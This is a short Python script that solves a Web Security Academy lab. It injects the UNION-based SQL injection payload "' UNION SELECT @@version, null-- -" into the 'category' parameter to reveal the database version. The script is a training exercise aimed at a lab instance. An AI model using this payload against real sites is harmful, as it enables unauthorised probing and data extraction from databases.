###############################################################################
#
# Lab: SQL injection attack, querying the database type and version on MySQL
#      and Microsoft
#
# Hack Steps: 
#      1. Inject payload into 'category' query parameter
#      2. Observe that the database version is returned in the response
#
###############################################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a3b00f7035a45eb809767ff002100e0.web-security-academy.net"

def main():
    print("⦗#⦘ Injection parameter: " + Fore.YELLOW + "category")
    print(Fore.WHITE + "❯❯ Injecting payload to retrieve the database version.. ", end="", flush=True)

    payload = "' UNION SELECT @@version, null-- -"

    try:  
       requests.get(f"{LAB_URL}/filter?category={payload}")
        
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch the page with the injected payload through exception")
        exit(1)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

if __name__ == "__main__":
    main()
